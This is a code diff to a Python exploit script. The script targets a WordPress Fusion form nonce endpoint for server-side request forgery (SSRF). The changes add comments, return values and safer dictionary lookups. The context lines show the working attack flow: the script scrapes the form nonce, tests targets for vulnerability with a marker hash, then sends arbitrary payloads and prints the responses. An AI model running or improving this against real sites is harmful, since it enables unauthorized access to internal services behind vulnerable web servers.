@@ -16,12 +16,12 @@ def encode_multipart_form_data(fields):
     boundary = binascii.hexlify(os.urandom(16)).decode('ascii')
 
     body = (
-            "".join("--%s\r\n"
-                    "Content-Disposition: form-data; name=\"%s\"\r\n"
-                    "\r\n"
-                    "%s\r\n" % (boundary, field, value)
-                    for field, value in fields.items()) +
-            "--%s--\r\n" % boundary
+        "".join("--%s\r\n"
+                "Content-Disposition: form-data; name=\"%s\"\r\n"
+                "\r\n"
+                "%s\r\n" % (boundary, field, value)
+                for field, value in fields.items()) +
+        "--%s--\r\n" % boundary
     )
 
     content_type = "multipart/form-data; boundary=%s" % boundary
@@ -32,11 +32,13 @@ def encode_multipart_form_data(fields):
 def make_folder(domain):
     os.makedirs("output", exist_ok=True)
     os.makedirs(f"output/{domain}", exist_ok=True)
+    return True  # Return True to indicate the folder was created
 
 
 def save_fusion_id(domain, fusion_id):
     with open(f"output/{domain}/fusion_id.txt", "w") as f:
         f.write(fusion_id)
+    return True  # Return True to indicate the fusion ID was saved
 
 
 def load_fusion_id(domain):
@@ -44,7 +46,7 @@ def load_fusion_id(domain):
         with open(f"output/{domain}/fusion_id.txt", "r") as f:
             return f.read()
     else:
-        return None
+        return None  # Return None if no fusion ID exists
 
 
 def generate_fusion_id(url, domain):
@@ -70,20 +72,20 @@ def generate_fusion_id(url, domain):
             try:
                 fusion_id = soup.find("input", {"name": "fusion-form-nonce-0"})["value"]
                 save_fusion_id(domain, fusion_id)
-                return fusion_id
+                return fusion_id  # Return the newly generated fusion ID
             except TypeError:
-                return None
+                return None  # Return None if the fusion ID couldn't be found
         else:
-            return None
+            return None  # Return None if the request failed
     else:
-        return fusion_id
+        return fusion_id  # Return the existing fusion ID
 
 
 def exploit(url, domain, payload, request):
     fusion_id = generate_fusion_id(url, domain)
 
     if fusion_id is None:
-        return False
+        return {"status": "failed"}  # Return a failed status if fusion ID generation fails
 
     data = {
         "formData": f"email=example%40example.com&fusion_privacy_store_ip_ua=false"
@@ -115,11 +117,11 @@ def exploit(url, domain, payload, request):
     request['request'] = r.request  
     if r.status_code == 200:
         try:
-            return r.json()
+            return r.json()  # Return the JSON response if successful
         except json.decoder.JSONDecodeError:
-            return {"status": "failed"}
+            return {"status": "failed"}  # Return failed status if JSON decoding fails
     else:
-        return {"status": "failed"}
+        return {"status": "failed"}  # Return failed status for non-200 responses
 
 
 def save_raw_request(request, filename):
@@ -129,6 +131,7 @@ def save_raw_request(request, filename):
         f.write("\r\n".join(headers))
         f.write("\r\n\r\n")
         f.write(request.body)
+    return True  # Return True to indicate the request was saved
 
 
 def run_exploit(profile_url):
@@ -141,7 +144,7 @@ def run_exploit(profile_url):
     print("[+] Testing SSRF...")
     result = exploit(url, domain, test_url, request)
     
-    if "3e87da640674ddd9c7bafbc1932b91c9" in result['info']:
+    if "3e87da640674ddd9c7bafbc1932b91c9" in result.get('info', ''):  # Use .get to avoid KeyError
         print("[+] Target is vulnerable to SSRF!")
         print("[+] Saving raw request...")
         save_raw_request(request['request'], f"output/{domain}/raw_request.txt")
@@ -153,10 +156,13 @@ def run_exploit(profile_url):
                 break
             print("[+] Sending payload...")
             result = exploit(url, domain, payload, request)
-            if result['status'] == 'success':
+            if result.get('status') == 'success':
                 print("[+] Response:")
                 print(result['info'])
             else:
                 print("[-] Payload is not working!")
+                return
     else:
         print("[-] Target is not vulnerable to SSRF!")
+        return
+
